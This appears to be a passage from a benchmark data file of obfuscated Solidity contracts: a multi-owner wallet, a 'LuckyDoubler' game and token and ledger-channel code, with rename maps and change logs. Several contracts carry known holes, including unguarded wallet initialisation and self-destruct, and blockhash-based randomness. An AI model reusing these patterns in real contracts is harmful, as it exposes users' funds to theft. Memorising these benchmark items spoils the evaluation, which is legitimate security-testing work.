_0x225b9d { if (_0xafb805 > 0) throw; _; }\n\n  // constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  function _0x417b32(address[] _0x97d4ea, uint _0xac5fe8, uint _0xe7ed36) _0x225b9d {\n    _0x661bfa(_0xe7ed36);\n    _0x72ef61(_0x97d4ea, _0xac5fe8);\n  }\n\n  // kills the contract sending everything to `_to`.\n  function _0x27e9b2(address _0x29c4ab) _0x3c374d(_0xf8fca3(msg.data)) external {\n    suicide(_0x29c4ab);\n  }\n\n  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.\n  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide\n  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value\n  // and _data arguments). They still get the option of using them if they want, anyways.\n  function _0xd4d7e3(address _0x29c4ab, uint _0xe191ce, bytes _0x8fe051) external _0x8e7cce returns (bytes32 _0xbfefda) {\n    // first, take the opportunity to check that we're under the daily limit.\n    if ((_0x8fe051.length == 0 && _0xd37d30(_0xe191ce)) || _0x3a5415 == 1) {\n      // yes - just execute the call.\n      address _0x97bbae;\n      if (_0x29c4ab == 0) {\n        _0x97bbae = _0xfc4670(_0xe191ce, _0x8fe051);\n      } else {\n        if (!_0x29c4ab.call.value(_0xe191ce)(_0x8fe051))\n          throw;\n      }\n      SingleTransact(msg.sender, _0xe191ce, _0x29c4ab, _0x8fe051, _0x97bbae);\n    } else {\n      // determine our operation hash.\n      if (true) { _0xbfefda = _0xf8fca3(msg.data, block.number); }\n      // store if it's new\n      if (_0xeeb2ee[_0xbfefda]._0xe02a33 == 0 && _0xeeb2ee[_0xbfefda].value == 0 && _0xeeb2ee[_0xbfefda].data.length == 0) {\n        _0xeeb2ee[_0xbfefda]._0xe02a33 = _0x29c4ab;\n        _0xeeb2ee[_0xbfefda].value = _0xe191ce;\n        _0xeeb2ee[_0xbfefda].data = _0x8fe051;\n      }\n      if (!_0x845e55(_0xbfefda)) {\n        ConfirmationNeeded(_0xbfefda, msg.sender, _0xe191ce, _0x29c4ab, _0x8fe051);\n      }\n    }\n  }\n\n  function _0xfc4670(uint _0xe191ce, bytes _0xd209dc) internal returns (address _0xf72d56) {\n  }\n\n  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order\n  // to determine the body of the transaction from the hash provided.\n  function _0x845e55(bytes32 _0x2d5886) _0x3c374d(_0x2d5886) returns (bool _0xa3a988) {\n    if (_0xeeb2ee[_0x2d5886]._0xe02a33 != 0 || _0xeeb2ee[_0x2d5886].value != 0 || _0xeeb2ee[_0x2d5886].data.length != 0) {\n      address _0x97bbae;\n      if (_0xeeb2ee[_0x2d5886]._0xe02a33 == 0) {\n        _0x97bbae = _0xfc4670(_0xeeb2ee[_0x2d5886].value, _0xeeb2ee[_0x2d5886].data);\n      } else {\n        if (!_0xeeb2ee[_0x2d5886]._0xe02a33.call.value(_0xeeb2ee[_0x2d5886].value)(_0xeeb2ee[_0x2d5886].data))\n          throw;\n      }\n\n      MultiTransact(msg.sender, _0x2d5886, _0xeeb2ee[_0x2d5886].value, _0xeeb2ee[_0x2d5886]._0xe02a33, _0xeeb2ee[_0x2d5886].data, _0x97bbae);\n      delete _0xeeb2ee[_0x2d5886];\n      return true;\n    }\n  }\n\n  // INTERNAL METHODS\n\n  function _0xadd994(bytes32 _0x48aff3) internal returns (bool) {\n    // determine what index the present sender is:\n    uint _0x89ae1a = _0x87d4ac[uint(msg.sender)];\n    // make sure they're an owner\n    if (_0x89ae1a == 0) return;\n\n    var _0xce122d = _0x44c682[_0x48aff3];\n    // if we're not yet working on this operation, switch over and reset the confirmation status.\n    if (_0xce122d._0x190f38 == 0) {\n      // reset count of confirmations needed.\n      _0xce122d._0x190f38 = _0x3a5415;\n      // reset which owners have confirmed (none) - set our bitmap to 0.\n      _0xce122d._0x264338 = 0;\n      _0xce122d._0x5d1c2a = _0xae34c3.length++;\n      _0xae34c3[_0xce122d._0x5d1c2a] = _0x48aff3;\n    }\n    // determine the bit to set for this owner.\n    uint _0xe6a53f = 2**_0x89ae1a;\n    // make sure we (the message sender) haven't confirmed this operation previously.\n    if (_0xce122d._0x264338 & _0xe6a53f == 0) {\n      Confirmation(msg.sender, _0x48aff3);\n      // ok - check if count is enough to go ahead.\n      if (_0xce122d._0x190f38 <= 1) {\n        // enough confirmations: reset and run interior.\n        delete _0xae34c3[_0x44c682[_0x48aff3]._0x5d1c2a];\n        delete _0x44c682[_0x48aff3];\n        return true;\n      }\n      else\n      {\n        // not enough: record that this owner in particular confirmed.\n        _0xce122d._0x190f38--;\n        _0xce122d._0x264338 |= _0xe6a53f;\n      }\n    }\n  }\n\n  function _0x279070() private {\n    uint _0xa615f6 = 1;\n    while (_0xa615f6 < _0xafb805)\n    {\n      while (_0xa615f6 < _0xafb805 && _0xb1d252[_0xa615f6] != 0) _0xa615f6++;\n      while (_0xafb805 > 1 && _0xb1d252[_0xafb805] == 0) _0xafb805--;\n      if (_0xa615f6 < _0xafb805 && _0xb1d252[_0xafb805] != 0 && _0xb1d252[_0xa615f6] == 0)\n      {\n        _0xb1d252[_0xa615f6] = _0xb1d252[_0xafb805];\n        _0x87d4ac[_0xb1d252[_0xa615f6]] = _0xa615f6;\n        _0xb1d252[_0xafb805] = 0;\n      }\n    }\n  }\n\n  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and\n  // returns true. otherwise just returns false.\n  function _0xd37d30(uint _0xe191ce) internal _0x8e7cce returns (bool) {\n    // reset the spend limit if we're on a different day to last time.\n    if (_0xa2cf1e() > _0xd26109) {\n      _0xd3e03b = 0;\n      if (block.timestamp > 0) { _0xd26109 = _0xa2cf1e(); }\n    }\n    // check to see if there's enough left - if so, subtract and return true.\n\n    if (_0xd3e03b + _0xe191ce >= _0xd3e03b && _0xd3e03b + _0xe191ce <= _0x04363a) {\n      _0xd3e03b += _0xe191ce;\n      return true;\n    }\n    return false;\n  }\n\n  // determines today's index.\n  function _0xa2cf1e() private constant returns (uint) { return _0xcf9679 / 1 days; }\n\n  function _0x01da05() internal {\n    uint length = _0xae34c3.length;\n\n    for (uint i = 0; i < length; ++i) {\n      delete _0xeeb2ee[_0xae34c3[i]];\n\n      if (_0xae34c3[i] != 0)\n        delete _0x44c682[_0xae34c3[i]];\n    }\n\n    delete _0xae34c3;\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public _0x3a5415;\n  // pointer used to find a free slot in m_owners\n  uint public _0xafb805;\n\n  uint public _0x04363a;\n  uint public _0xd3e03b;\n  uint public _0xd26109;\n\n  // list of owners\n  uint[256] _0xb1d252;\n\n  uint constant _0xa873bb = 250;\n  // index on the list of owners to allow reverse lookup\n  mapping(uint => uint) _0x87d4ac;\n  // the ongoing operations.\n  mapping(bytes32 => PendingState) _0x44c682;\n  bytes32[] _0xae34c3;\n\n  // pending transactions we have at present.\n  mapping (bytes32 => Transaction) _0xeeb2ee;\n}\n",
      "rename_map": {
        "only_uninitialized": "_0x225b9d",
        "changeRequirement": "_0x823039",
        "reorganizeOwners": "_0x279070",
        "confirmAndCheck": "_0xadd994",
        "resetSpentToday": "_0x3463b1",
        "newRequirement": "_0x990608",
        "m_pendingIndex": "_0xae34c3",
        "initMultiowned": "_0x72ef61",
        "onlymanyowners": "_0x3c374d",
        "setDailyLimit": "_0xf2a570",
        "ownerIndexBit": "_0xe6a53f",
        "clearPending": "_0x01da05",
        "m_dailyLimit": "_0x04363a",
        "_newRequired": "_0xd4624c",
        "hasConfirmed": "_0x03f389",
        "initDaylimit": "_0x661bfa",
        "m_spentToday": "_0xd3e03b",
        "m_ownerIndex": "_0x87d4ac",
        "removeOwner": "_0x323e3e",
        "changeOwner": "_0x236f31",
        "m_numOwners": "_0xafb805",
        "c_maxOwners": "_0xa873bb",
        "ownerIndex": "_0x89ae1a",
        "ownersDone": "_0x264338",
        "_operation": "_0x48aff3",
        "m_required": "_0x3a5415",
        "underLimit": "_0xd37d30",
        "initWallet": "_0x417b32",
        "yetNeeded": "_0x190f38",
        "_newLimit": "_0xfedb45",
        "operation": "_0x62398c",
        "m_lastDay": "_0xd26109",
        "_required": "_0xac5fe8",
        "o_success": "_0xa3a988",
        "m_pending": "_0x44c682",
        "initiator": "_0xb5f871",
        "onlyowner": "_0x8e7cce",
        "_daylimit": "_0xe7ed36",
        "newOwner": "_0x5962ad",
        "addOwner": "_0x592634",
        "oldOwner": "_0xfbc950",
        "m_owners": "_0xb1d252",
        "getOwner": "_0xefecb4",
        "confirm": "_0x845e55",
        "isOwner": "_0x7b440b",
        "execute": "_0xd4d7e3",
        "created": "_0x97bbae",
        "_owners": "_0x97d4ea",
        "pending": "_0xce122d",
        "_owner": "_0xe22013",
        "o_hash": "_0xbfefda",
        "_value": "_0xe191ce",
        "revoke": "_0x814bf8",
        "_limit": "_0x533df6",
        "create": "_0xfc4670",
        "o_addr": "_0xf72d56",
        "_from": "_0x32a8e3",
        "m_txs": "_0xeeb2ee",
        "_code": "_0xd209dc",
        "index": "_0x5d1c2a",
        "today": "_0xa2cf1e",
        "_addr": "_0x8eab3d",
        "owner": "_0x17faed",
        "_data": "_0x8fe051",
        "free": "_0xa615f6",
        "kill": "_0x27e9b2",
        "sha3": "_0xf8fca3",
        "_to": "_0x29c4ab",
        "now": "_0xcf9679",
        "to": "_0xe02a33",
        "_h": "_0x2d5886"
      },
      "changes": [
        "Renamed 71 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_210",
      "transformed_id": "ss_l4_medium_sn_ds_210",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\n\n contract LuckyDoubler {\n//##########################################################\n//#### LuckyDoubler: A doubler with random payout order ####\n//#### Deposit 1 ETHER to participate                   ####\n//##########################################################\n//COPYRIGHT 2016 KATATSUKI ALL RIGHTS RESERVED\n//No part of this source code may be reproduced, distributed,\n//modified or transmitted in any form or by any means without\n//the prior written permission of the creator.\n\n    address private _0x94ab79;\n\n    //Stored variables\n    uint private balance = 0;\n    uint private _0x1dc8d2 = 5;\n    uint private _0xdb8ec2 = 125;\n\n    mapping (address => User) private _0x20b05c;\n    Entry[] private _0x4167fb;\n    uint[] private _0x14d1fd;\n\n    //Set owner on contract creation\n    function LuckyDoubler() {\n        _0x94ab79 = msg.sender;\n    }\n\n    modifier _0xe8797f { if (msg.sender == _0x94ab79) _; }\n\n    struct User {\n        address _0xa4d29a;\n        uint _0xeae62d;\n        uint _0xb4905d;\n    }\n\n    struct Entry {\n        address _0x29b8bc;\n        uint _0x43f7ba;\n        uint _0x94695e;\n        bool _0x45b592;\n    }\n\n    //Fallback function\n    function() {\n        _0x8c9e9e();\n    }\n\n    function _0x8c9e9e() private{\n        bool _flag1 = false;\n        if (false) { revert(); }\n\n        if (msg.value < 1 ether) {\n             msg.sender.send(msg.value);\n            return;\n        }\n\n        _0xfe2b26();\n    }\n\n    function _0xfe2b26() private {\n        // Placeholder for future logic\n        if (false) { revert(); }\n\n        //Limit deposits to 1ETH\n        uint _0x0046e8 = 1 ether;\n\n        if (msg.value > 1 ether) {\n\n        \tmsg.sender.send(msg.value - 1 ether);\n         if (block.timestamp > 0) { _0x0046e8 = 1 ether; }\n        }\n\n        //Add new users to the users array\n        if (_0x20b05c[msg.sender]._0xa4d29a == address(0))\n        {\n            _0x20b05c[msg.sender]._0xa4d29a = msg.sender;\n            _0x20b05c[msg.sender]._0xeae62d = 0;\n            _0x20b05c[msg.sender]._0xb4905d = 0;\n        }\n\n        //Add new entry to the entries array\n        _0x4167fb.push(Entry(msg.sender, _0x0046e8, (_0x0046e8 * (_0xdb8ec2) / 100), false));\n        _0x20b05c[msg.sender]._0xeae62d++;\n        _0x14d1fd.push(_0x4167fb.length -1);\n\n        //Collect fees and update contract balance\n        balance += (_0x0046e8 * (100 - _0x1dc8d2)) / 100;\n\n        uint _0x1852bc = _0x14d1fd.length > 1 ? _0x07613b(_0x14d1fd.length) : 0;\n        Entry _0x369bd9 = _0x4167fb[_0x14d1fd[_0x1852bc]];\n\n        //Pay pending entries if the new balance allows for it\n        if (balance > _0x369bd9._0x94695e) {\n\n            uint _0x94695e = _0x369bd9._0x94695e;\n\n            _0x369bd9._0x29b8bc.send(_0x94695e);\n            _0x369bd9._0x45b592 = true;\n            _0x20b05c[_0x369bd9._0x29b8bc]._0xb4905d++;\n\n            balance -= _0x94695e;\n\n            if (_0x1852bc < _0x14d1fd.length - 1)\n                _0x14d1fd[_0x1852bc] = _0x14d1fd[_0x14d1fd.length - 1];\n\n            _0x14d1fd.length--;\n\n        }\n\n        //Collect money from fees and possible leftovers from errors (actual balance untouched)\n        uint _0xe39f2d = this.balance - balance;\n        if (_0xe39f2d > 0)\n        {\n                _0x94ab79.send(_0xe39f2d);\n        }\n\n    }\n\n    //Generate random number between 0 & max\n    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;\n    function _0x07613b(uint _0x28e2db) constant private returns (uint256 _0x343010){\n        uint256 _0x28eda0 = FACTOR * 100 / _0x28e2db;\n        uint256 _0x1d5716 = block.number - 1;\n        uint256 _0x3336fa = uint256(block.blockhash(_0x1d5716));\n\n        return uint256((uint256(_0x3336fa) / _0x28eda0)) % _0x28e2db;\n    }\n\n    //Contract management\n    function _0x37efa4(address _0x4d4119) _0xe8797f {\n        if (1 == 1) { _0x94ab79 = _0x4d4119; }\n    }\n\n    function _0xde6317(uint _0xa8656f) _0xe8797f {\n        if (_0xa8656f < 110 || _0xa8656f > 150) throw;\n\n        _0xdb8ec2 = _0xa8656f;\n    }\n\n    function _0x2c1a39(uint _0x67cca0) _0xe8797f {\n        if (_0x1dc8d2 > 5)\n            throw;\n        _0x1dc8d2 = _0x67cca0;\n    }\n\n    //JSON functions\n    function _0xb4ba94() constant returns (uint _0x28eda0, string _0x710afe) {\n        _0x28eda0 = _0xdb8ec2;\n        _0x710afe = 'The current _0xdb8ec2 applied to all _0xeae62d. Min 110%, _0x28e2db 150%.';\n    }\n\n    function _0xd1e432() constant returns (uint _0x511325, string _0x710afe) {\n        _0x511325 = _0x1dc8d2;\n        _0x710afe = 'The _0x1dc8d2 percentage applied to all _0xeae62d. It can change to speed _0x2dba87 (_0x28e2db 5%).';\n    }\n\n    function _0xb459b0() constant returns (uint _0x7d26c5, string _0x710afe) {\n        if (true) { _0x7d26c5 = _0x4167fb.length; }\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x710afe = 'The number of _0xeae62d.'; }\n    }\n\n    function _0xa6e39b(address _0x5891fd) constant returns (uint _0xeae62d, uint _0x2dba87, string _0x710afe)\n    {\n        if (_0x20b05c[_0x5891fd]._0xa4d29a != address(0x0))\n        {\n            _0xeae62d = _0x20b05c[_0x5891fd]._0xeae62d;\n            _0x2dba87 = _0x20b05c[_0x5891fd]._0xb4905d;\n            _0x710afe = 'Users stats: total _0xeae62d, _0x2dba87 received.';\n        }\n    }\n\n    function _0x3d57d1(uint _0x1852bc) constant returns (address _0x5891fd, uint _0x94695e, bool _0x45b592, string _0x710afe)\n    {\n        if (_0x1852bc < _0x4167fb.length) {\n            _0x5891fd = _0x4167fb[_0x1852bc]._0x29b8bc;\n            _0x94695e = _0x4167fb[_0x1852bc]._0x94695e / 1 finney;\n            _0x45b592 = _0x4167fb[_0x1852bc]._0x45b592;\n            _0x710afe = 'Entry _0x710afe: _0x5891fd address, expected _0x94695e in Finneys, _0x94695e status.';\n        }\n    }\n\n}\n",
      "rename_map": {
        "multiplierFactor": "_0xb4ba94",
        "changeMultiplier": "_0xde6317",
        "lastBlockNumber": "_0x1d5716",
        "payoutsReceived": "_0xb4905d",
        "feePercentage": "_0x511325",
        "unpaidEntries": "_0x14d1fd",
        "entryAddress": "_0x29b8bc",
        "entryDetails": "_0x3d57d1",
        "totalEntries": "_0xb459b0",
        "changeOwner": "_0x37efa4",
        "multiplier": "_0xdb8ec2",
        "currentFee": "_0xd1e432",
        "changeFee": "_0x2c1a39",
        "userStats": "_0xa6e39b",
        "onlyowner": "_0xe8797f",
        "newOwner": "_0x4d4119",
        "theEntry": "_0x369bd9",
        "deposits": "_0xeae62d",
        "payouts": "_0x2dba87",
        "entries": "_0x4167fb",
        "deposit": "_0x43f7ba",
        "hashVal": "_0x3336fa",
        "payout": "_0x94695e",
        "result": "_0x343010",
        "newFee": "_0x67cca0",
        "dValue": "_0x0046e8",
        "factor": "_0x28eda0",
        "multi": "_0xa8656f",
        "count": "_0x7d26c5",
        "index": "_0x1852bc",
        "users": "_0x20b05c",
        "owner": "_0x94ab79",
        "fees": "_0xe39f2d",
        "init": "_0x8c9e9e",
        "user": "_0x5891fd",
        "rand": "_0x07613b",
        "paid": "_0x45b592",
        "join": "_0xfe2b26",
        "info": "_0x710afe",
        "fee": "_0x1dc8d2",
        "max": "_0x28e2db",
        "id": "_0xa4d29a"
      },
      "changes": [
        "Renamed 42 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_211",
      "transformed_id": "ss_l4_medium_sn_ds_211",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": " pragma solidity ^0.4.23;\n // produced by the Solididy File Flattener (c) David Appleton 2018\n // contact : dave@akomba.com\n // released under Apache 2.0 licence\n contract Token {\n     /// total amount of tokens\n     uint256 public _0x94d9b0;\n\n     /// @param _owner The address from which the balance will be retrieved\n     /// @return The balance\n     function _0xf0c1cd(address _0xc98d14) public constant returns (uint256 balance);\n\n     /// @notice send `_value` token to `_to` from `msg.sender`\n     /// @param _to The address of the recipient\n     /// @param _value The amount of token to be transferred\n     /// @return Whether the transfer was successful or not\n     function transfer(address _0x84adaa, uint256 _0x54722c) public returns (bool _0xee96a3);\n\n     /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n     /// @param _from The address of the sender\n     /// @param _to The address of the recipient\n     /// @param _value The amount of token to be transferred\n     /// @return Whether the transfer was successful or not\n     function _0x0a82db(address _0x280a17, address _0x84adaa, uint256 _0x54722c) public returns (bool _0xee96a3);\n\n     /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\n     /// @param _spender The address of the account able to transfer the tokens\n     /// @param _value The amount of tokens to be approved for transfer\n     /// @return Whether the approval was successful or not\n     function _0x9cac6d(address _0x23ec63, uint256 _0x54722c) public returns (bool _0xee96a3);\n\n     /// @param _owner The address of the account owning tokens\n     /// @param _spender The address of the account able to transfer the tokens\n     /// @return Amount of remaining tokens allowed to spent\n     function _0x6f75ce(address _0xc98d14, address _0x23ec63) public constant returns (uint256 _0x877bd0);\n\n     event Transfer(address indexed _0x280a17, address indexed _0x84adaa, uint256 _0x54722c);\n     event Approval(address indexed _0xc98d14, address indexed _0x23ec63, uint256 _0x54722c);\n }\n\n library ECTools {\n        bool _flag1 = false;\n        bool _flag2 = false;\n\n     // @dev Recovers the address which has signed a message\n     // @thanks https://gist.github.com/axic/5b33912c6f61ae6fd96d6c4a47afde6d\n     function _0x0b0492(bytes32 _0x81c4eb, string _0x6c0dd4) public pure returns (address) {\n        bool _flag3 = false;\n        bool _flag4 = false;\n         require(_0x81c4eb != 0x00);\n\n         // need this for test RPC\n         bytes memory _0x4c7132 = \"\\x19Ethereum Signed Message:\\n32\";\n         bytes32 _0xdb6445 = _0x1d7afd(abi._0x7946b2(_0x4c7132, _0x81c4eb));\n\n         if (bytes(_0x6c0dd4).length != 132) {\n             return 0x0;\n         }\n         bytes32 r;\n         bytes32 s;\n         uint8 v;\n         bytes memory sig = _0x974b5d(_0x5e3474(_0x6c0dd4, 2, 132));\n         assembly {\n             r := mload(add(sig, 32))\n             s := mload(add(sig, 64))\n             v := byte(0, mload(add(sig, 96)))\n         }\n         if (v < 27) {\n             v += 27;\n         }\n         if (v < 27 || v > 28) {\n             return 0x0;\n         }\n         return _0x5e875e(_0xdb6445, v, r, s);\n     }\n\n     // @dev Verifies if the message is signed by an address\n     function _0xb9154c(bytes32 _0x81c4eb, string _0x6c0dd4, address _0x8e0dc1) public pure returns (bool) {\n         require(_0x8e0dc1 != 0x0);\n\n         return _0x8e0dc1 == _0x0b0492(_0x81c4eb, _0x6c0dd4);\n     }\n\n     // @dev Converts an hexstring to bytes\n     function _0x974b5d(string _0xc6b3b0) public pure returns (bytes) {\n         uint _0xdb8135 = bytes(_0xc6b3b0).length;\n         require(_0xdb8135 % 2 == 0);\n\n         bytes memory _0x80374d = bytes(new string(_0xdb8135 / 2));\n         uint k = 0;\n         string memory s;\n         string memory r;\n         for (uint i = 0; i < _0xdb8135; i += 2) {\n             s = _0x5e3474(_0xc6b3b0, i, i + 1);\n             if (msg.sender != address(0) || msg.sender == address(0)) { r = _0x5e3474(_0xc6b3b0, i + 1, i + 2); }\n             uint p = _0xfa00dd(s) * 16 + _0xfa00dd(r);\n             _0x80374d[k++] = _0x013293(p)[31];\n         }\n         return _0x80374d;\n     }\n\n     // @dev Parses a hexchar, like 'a', and returns its hex value, in this case 10\n     function _0xfa00dd(string _0x1aeafa) public pure returns (uint) {\n         bytes memory _0xf20652 = bytes(_0x1aeafa);\n         // bool decimals = false;\n         if ((_0xf20652[0] >= 48) && (_0xf20652[0] <= 57)) {\n             return uint(_0xf20652[0]) - 48;\n         } else if ((_0xf20652[0] >= 65) && (_0xf20652[0] <= 70)) {\n             return uint(_0xf20652[0]) - 55;\n         } else if ((_0xf20652[0] >= 97) && (_0xf20652[0] <= 102)) {\n             return uint(_0xf20652[0]) - 87;\n         } else {\n             revert();\n         }\n     }\n\n     // @dev Converts a uint to a bytes32\n     // @thanks https://ethereum.stackexchange.com/questions/4170/how-to-convert-a-uint-to-bytes-in-solidity\n     function _0x013293(uint _0x2c1d82) public pure returns (bytes b) {\n         b = new bytes(32);\n         assembly {mstore(add(b, 32), _0x2c1d82)}\n     }\n\n     // @dev Hashes the signed message\n     // @ref https://github.com/ethereum/go-ethereum/issues/3731#issuecomment-293866868\n     function _0x1f8c57(string _0x83e756) public pure returns (bytes32) {\n         uint _0xdb8135 = bytes(_0x83e756).length;\n         require(_0xdb8135 > 0);\n         bytes memory _0x4c7132 = \"\\x19Ethereum Signed Message:\\n\";\n         return _0x1d7afd(abi._0x7946b2(_0x4c7132, _0x36eefd(_0xdb8135), _0x83e756));\n     }\n\n     // @dev Converts a uint in a string\n     function _0x36eefd(uint _0x2c1d82) public pure returns (string _0xc259a9) {\n         uint _0xdb8135 = 0;\n         uint m = _0x2c1d82 + 0;\n         while (m != 0) {\n             _0xdb8135++;\n             m /= 10;\n         }\n         bytes memory b = new bytes(_0xdb8135);\n         uint i = _0xdb8135 - 1;\n         while (_0x2c1d82 != 0) {\n             uint _0x0166ab = _0x2c1d82 % 10;\n             if (true) { _0x2c1d82 = _0x2c1d82 / 10; }\n             b[i--] = byte(48 + _0x0166ab);\n         }\n         _0xc259a9 = string(b);\n     }\n\n     // @dev extract a substring\n     // @thanks https://ethereum.stackexchange.com/questions/31457/substring-in-solidity\n     function _0x5e3474(string _0x012db8, uint _0xcd6055, uint _0x86694c) public pure returns (string) {\n         bytes memory _0x2c3fc4 = bytes(_0x012db8);\n         require(_0xcd6055 <= _0x86694c);\n         require(_0xcd6055 >= 0);\n         require(_0x86694c <= _0x2c3fc4.length);\n\n         bytes memory _0xac0911 = new bytes(_0x86694c - _0xcd6055);\n         for (uint i = _0xcd6055; i < _0x86694c; i++) {\n             _0xac0911[i - _0xcd6055] = _0x2c3fc4[i];\n         }\n         return string(_0xac0911);\n     }\n }\n contract StandardToken is Token {\n\n     function transfer(address _0x84adaa, uint256 _0x54722c) public returns (bool _0xee96a3) {\n         //Default assumes totalSupply can't be over max (2^256 - 1).\n         //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n         //Replace the if with this one instead.\n         //require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n         require(_0xd697d7[msg.sender] >= _0x54722c);\n         _0xd697d7[msg.sender] -= _0x54722c;\n         _0xd697d7[_0x84adaa] += _0x54722c;\n         emit Transfer(msg.sender, _0x84adaa, _0x54722c);\n         return true;\n     }\n\n     function _0x0a82db(address _0x280a17, address _0x84adaa, uint256 _0x54722c) public returns (bool _0xee96a3) {\n\n         //require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n         require(_0xd697d7[_0x280a17] >= _0x54722c && _0x785c9a[_0x280a17][msg.sender] >= _0x54722c);\n         _0xd697d7[_0x84adaa] += _0x54722c;\n         _0xd697d7[_0x280a17] -= _0x54722c;\n         _0x785c9a[_0x280a17][msg.sender] -= _0x54722c;\n         emit Transfer(_0x280a17, _0x84adaa, _0x54722c);\n         return true;\n     }\n\n     function _0xf0c1cd(address _0xc98d14) public constant returns (uint256 balance) {\n         return _0xd697d7[_0xc98d14];\n     }\n\n     function _0x9cac6d(address _0x23ec63, uint256 _0x54722c) public returns (bool _0xee96a3) {\n         _0x785c9a[msg.sender][_0x23ec63] = _0x54722c;\n         emit Approval(msg.sender, _0x23ec63, _0x54722c);\n         return true;\n     }\n\n     function _0x6f75ce(address _0xc98d14, address _0x23ec63) public constant returns (uint256 _0x877bd0) {\n       return _0x785c9a[_0xc98d14][_0x23ec63];\n     }\n\n     mapping (address => uint256) _0xd697d7;\n     mapping (address => mapping (address => uint256)) _0x785c9a;\n }\n\n contract HumanStandardToken is StandardToken {\n\n     /* Public variables of the token */\n\n     string public _0x1e5d7b;                   //fancy name: eg Simon Bucks\n     uint8 public _0x639a00;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n     string public _0x45e7f2;                 //An identifier: eg SBX\n     string public _0x343805 = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\n\n     constructor(\n         uint256 _0xf3fe41,\n         string _0x102938,\n         uint8 _0x015283,\n         string _0x67e766\n         ) public {\n         _0xd697d7[msg.sender] = _0xf3fe41;               // Give the creator all initial tokens\n         _0x94d9b0 = _0xf3fe41;                        // Update total supply\n         _0x1e5d7b = _0x102938;                                   // Set the name for display purposes\n         _0x639a00 = _0x015283;                            // Amount of decimals for display purposes\n         _0x45e7f2 = _0x67e766;                               // Set the symbol for display purposes\n     }\n\n     /* Approves and then calls the receiving contract */\n     function _0x9ec0df(address _0x23ec63, uint256 _0x54722c, bytes _0x3e8e55) public returns (bool _0xee96a3) {\n         _0x785c9a[msg.sender][_0x23ec63] = _0x54722c;\n         emit Approval(msg.sender, _0x23ec63, _0x54722c);\n\n         //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n         //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n         //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n         require(_0x23ec63.call(bytes4(bytes32(_0x1d7afd(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _0x54722c, this, _0x3e8e55));\n         return true;\n     }\n }\n\n contract LedgerChannel {\n\n     string public constant NAME = \"Ledger Channel\";\n     string public constant VERSION = \"0.0.1\";\n\n     uint256 public _0xc692b1 = 0;\n\n     event DidLCOpen (\n         bytes32 indexed _0x572b8c,\n         address indexed _0x0db2d4,\n         address indexed _0xa3d1d8,\n         uint256 _0xae3fa3,\n         address _0xfab703,\n         uint256 _0x03c1f1,\n         uint256 LCopenTimeout\n     );\n\n     event DidLCJoin (\n         bytes32 indexed _0x572b8c,\n         uint256 _0x7caf32,\n         uint256 _0x155809\n     );\n\n     event DidLCDeposit (\n         bytes32 indexed _0x572b8c,\n         address indexed _0x88c383,\n         uint256 _0x6a715e,\n         bool _0x7838d6\n     );\n\n     event DidLCUpdateState (\n         bytes32 indexed _0x572b8c,\n         uint256 _0xa1e930,\n         uint256 _0x6d37dc,\n         uint256 _0xae3fa3,\n         uint256 _0x03c1f1,\n         uint256 _0x7caf32,\n         uint256 _0x155809,\n         bytes32 _0x3832b4,\n         uint256 _0x5d1e89\n     );\n\n     event DidLCClose (\n         bytes32 indexed _0x572b8c,\n         uint256 _0xa1e930,\n         uint256 _0xae3fa3,\n         uint256 _0x03c1f1,\n         uint256 _0x7caf32,\n         uint256 _0x155809\n     );\n\n     event DidVCInit (\n         bytes32 indexed _0xb138e2,\n         bytes32 indexed _0x434ed0,\n         bytes _0x674fa3,\n         uint256 _0xa1e930,\n         address _0x0db2d4,\n         address _0x74588d,\n         uint256 _0xd447d6,\n         uint256 _0x37239e\n     );\n\n     event DidVCSettle (\n         bytes32 indexed _0xb138e2,\n         bytes32 indexed _0x434ed0,\n         uint256 _0x454d08,\n         uint256 _0xd109e0,\n         uint256 _0x30626e,\n         address _0xd1ec16,\n         uint256 _0xfba4e5\n     );\n\n     event DidVCClose(\n         bytes32 indexed _0xb138e2,\n         bytes32 indexed _0x434ed0,\n         uint256 _0xd447d6,\n         uint256 _0x37239e\n     );\n\n     struct Channel {\n         //TODO: figure out if it's better just to split arrays by balances/deposits instead of eth/erc20\n         address[2] _0xc63ab5; // 0: partyA 1: partyI\n         uint256[4] _0x33ffb0; // 0: balanceA 1:balanceI 2:depositedA 3:depositedI\n         uint256[4] _0x7958d2; // 